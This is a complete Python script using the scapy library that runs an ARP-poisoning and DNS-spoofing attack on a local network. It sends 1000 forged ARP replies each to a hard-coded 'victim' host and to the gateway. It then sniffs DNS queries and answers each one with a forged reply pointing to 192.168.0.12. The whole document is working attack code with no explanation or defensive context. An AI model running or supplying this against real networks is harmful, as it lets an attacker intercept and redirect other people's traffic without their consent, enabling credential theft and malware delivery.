#!/usr/bin/env python
from scapy.all import *


def buildpkt(pkt):

        if pkt.haslayer(DNS) and pkt.getlayer(DNS).qr == 0:
                ip = pkt.getlayer(IP)
                #udp = UDP()
                dns = pkt.getlayer(DNS)
                ip.src = pkt[IP].src
                ip.dst = pkt[IP].dst
                ip.sport = pkt[UDP].sport
                ip.dport = pkt[UDP].dport
                queryname = dns.qd.qname
                resp = IP(dst=ip.src, src=ip.dst)/UDP(dport=ip.sport,sport=ip.dport)/DNS(id=dns.id, qr=1, qd=dns.qd,an=DNSRR(rrname=queryname, ttl=10, rdata="192.168.0.12"))
                print queryname
                print resp
                send(resp)

vIP = "192.168.0.25"
vMAC = "d2:ce:8f:42:16:2c"
gIP = "192.168.0.1"
gMAC = "00:2e:5a:74:db:16"

#Spoof packets to the victim as if they come from the gateway
vSPOOF = ARP()
vSPOOF.op = 2
vSPOOF.psrc = gIP
vSPOOF.pdst = vIP
vSPOOF.hwdst = vMAC

#Spoof packets to the gateway as if they come from victim
gSPOOF = ARP()
gSPOOF.op = 2
gSPOOF.psrc = vIP
gSPOOF.pdst = gIP
gSPOOF.hwdst = gMAC

print 'poisoning ARP of victim'
send(vSPOOF, count=1000)
send(gSPOOF, count=1000)

while 1 :
        print 'sniffing for DNS packets'
        sniff(iface="eth0",count=1,filter="udp port 53",prn=buildpkt)


